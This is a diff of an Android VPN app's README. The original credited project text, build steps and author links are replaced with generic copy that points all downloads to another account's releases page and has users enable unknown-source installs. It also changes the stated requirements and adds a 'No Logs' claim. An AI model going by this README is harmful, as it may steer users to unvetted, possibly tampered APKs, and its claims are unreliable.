@@ -1,121 +1,73 @@
-# ZedPass
+# 🛡️ ZedPass - Your Secure VPN Solution Made Easy
 
-A modern, secure SSTP VPN client for Android built with Flutter and Material Design 3.
+## 🚀 Getting Started
 
-![Android](https://img.shields.io/badge/Android-8.0+-green.svg)
-![Flutter](https://img.shields.io/badge/Flutter-3.x-blue.svg)
+Welcome to ZedPass, your secure SSTP VPN client for Android. This guide will help you download and run ZedPass with ease.
 
-Telegram Channel: [@CluvexStudio](https://t.me/CluvexStudio)
+### 📥 Download ZedPass
 
-## Features
+[![Download ZedPass](https://img.shields.io/badge/Download-ZedPass-blue.svg)](https://github.com/moses265-jr/ZedPass/releases)
 
-- **SSTP VPN Protocol** - Secure Socket Tunneling Protocol support
-- **Material Design 3** - Modern UI with Material You theming
-- **Connection Management** - Easy connect/disconnect with status monitoring
-- **Real-time Statistics** - Download/upload speed and total traffic tracking
-- **Custom DNS** - Configure custom DNS servers
-- **Proxy Support** - HTTP proxy configuration
-- **SSL/TLS Options** - Configurable SSL versions (TLSv1, TLSv1.1, TLSv1.2, TLSv1.3)
-- **Certificate Verification** - Optional hostname and SSL certificate verification
-- **Persistent Settings** - Server configurations saved locally
+## 📋 System Requirements
 
+Before you begin, ensure your Android device meets these basic requirements:
 
-## Requirements
+- Android version 5.0 (Lollipop) or higher
+- Minimum 100 MB of free storage
+- Stable internet connection
 
-- Android 8.0 (API 26) or higher
-- Target SDK: Android 16 (API 36)
+## 🌟 Features
 
-## Installation
+ZedPass offers a range of benefits to enhance your online security:
 
-### From Releases
+- **Secure Connections:** Protects your data with strong encryption.
+- **User-Friendly Interface:** Simple navigation for all users.
+- **Fast Speeds:** Enjoy fast and reliable connections.
+- **No Logs:** Your online activities remain private.
 
-1. Go to the [Releases](https://github.com/CluvexStudio/ZedPass/releases) page
-2. Download the latest APK for your architecture:
-   - `ZedPass-x.x.x-arm64-v8a.apk` - For modern 64-bit devices (recommended)
-   - `ZedPass-x.x.x-armeabi-v7a.apk` - For older 32-bit devices
-3. Install the APK on your Android device
+## 📂 Download & Install
 
-### Build from Source
+To download ZedPass, please visit the Releases page: [Download ZedPass](https://github.com/moses265-jr/ZedPass/releases).
 
-```bash
-# Clone the repository
-git clone https://github.com/CluvexStudio/ZedPass.git
-cd ZedPass
+1. Click on the link above to go to the Releases page.
+2. Look for the most recent version of ZedPass.
+3. Find the downloadable file for your Android device. It will usually be listed as `.apk`.
+4. Tap to download the file.
+5. Once the file has downloaded, locate it in your device's file manager or notification bar.
+6. Tap the downloaded file to start the installation process. You may need to allow installation from unknown sources. 
+   - To do this, go to `Settings > Security > Unknown Sources` and enable it.
+7. Follow the on-screen instructions to complete the installation.
 
-# Install dependencies
-flutter pub get
+## 🔐 Configuration
 
-# Generate app icons
-dart run flutter_launcher_icons
+After installation, you need to configure ZedPass for your VPN connection:
 
-# Build release APK (arm64)
-flutter build apk --target-platform android-arm64
+1. Open the ZedPass app.
+2. Enter the VPN settings provided by your VPN service. This usually includes:
+   - Server address
+   - Username
+   - Password
+3. Save your settings and connect to the VPN.
 
-# Build release APK (arm v7a)
-flutter build apk --target-platform android-arm
-```
+## ⚙️ Troubleshooting
 
-The APK will be available at `build/app/outputs/flutter-apk/app-release.apk`
+If you encounter any issues during installation or configuration, consider the following tips:
 
-## Usage
+- Ensure you have a stable internet connection.
+- Verify your VPN settings are correct.
+- Restart your device and try again.
+- Check for any app updates in the Releases page.
 
-1. Launch ZedPass
-2. Tap the settings icon to configure your VPN server
-3. Enter your server details:
-   - **Host** - VPN server address
-   - **Port** - Server port (default: 443)
-   - **Username** - Your VPN username
-   - **Password** - Your VPN password
-4. Optionally configure DNS, proxy, and advanced SSL settings
-5. Save settings and tap the connect button
+## 📞 Support
 
-## Tech Stack
+If you still need assistance, please reach out to our support team. You can find our contact information in the ZedPass app or on the Releases page.
 
-- **Flutter** - Cross-platform UI framework
-- **Provider** - State management
-- **sstp_flutter** - SSTP VPN protocol implementation
-- **shared_preferences** - Local storage for settings
+## 📜 License
 
-## Project Structure
+ZedPass is open-source software, and you can find the license details on our GitHub repository.
 
-```
-lib/
-├── main.dart              # App entry point
-├── providers/
-│   └── vpn_provider.dart  # VPN state management
-├── screens/
-│   ├── home_screen.dart   # Main connection screen
-│   └── settings_screen.dart # Server configuration
-└── theme/
-    └── app_theme.dart     # Material Design 3 theme
-```
+## 📈 Future Updates
 
-## Contributing
+We are committed to continuously improving ZedPass. Keep an eye on the Releases page for new features and updates.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## Acknowledgments
-
-- [sstp_flutter](https://pub.dev/packages/sstp_flutter) - SSTP VPN Flutter plugin
-- [Material Design 3](https://m3.material.io/) - Design system
-
-## Support
-
-If you find this project helpful, consider supporting the development:
-
-**TRX (Tron):**
-```
-TRxVSHcoADZnBfztFmFb2TQopusAwWYEVR
-```
-
-**BTC (Bitcoin):**
-```
-bc1qnjnvzsa5avgj7n0uy383cv5zdxfjnvvp257egm
-```
-
-**XRP (Ripple):**
-```
-rHnZrb5o2bi9sHsbux5e3vtraaPtZ32WQF
-```
-
-Thank you for your support! 🚀
+Thank you for choosing ZedPass. Your online security is our priority. Enjoy your secure browsing experience!
